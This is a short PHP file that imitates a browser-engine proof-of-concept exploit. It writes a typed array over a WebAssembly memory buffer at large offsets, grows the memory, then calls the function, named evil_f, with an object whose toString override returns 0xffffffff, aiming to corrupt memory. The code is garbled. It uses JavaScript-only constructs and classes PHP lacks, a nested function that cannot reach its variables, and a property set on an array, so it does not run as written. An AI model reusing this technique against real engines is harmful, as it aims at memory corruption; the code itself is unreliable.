<?php
require'vendor/autoload.php';

function module($stdlib, $foreign, $buffer) {
    "use asm";
    $fl = new \WebAssembly\Uint32Array($buffer);
    function f1($x) {
        $x = (int)$x;
        $fl[0] = $x;
        $fl[0x10000] = $x;
        $fl[0x100000] = $x;
    }
    return $f1;
}

$global = ['Uint32Array' => \WebAssembly\Uint32Array::class];
$env = [];
$memory = new \WebAssembly\Memory(200);
$buffer = $memory->getBuffer();
$evil_f = module($global, $env, $buffer);

$zz = [];
$zz->toString = function() {
    array_slice([]);
    return 0xffffffff;
};
$evil_f(3);
$memory->grow(1);
$evil_f($zz);
?>
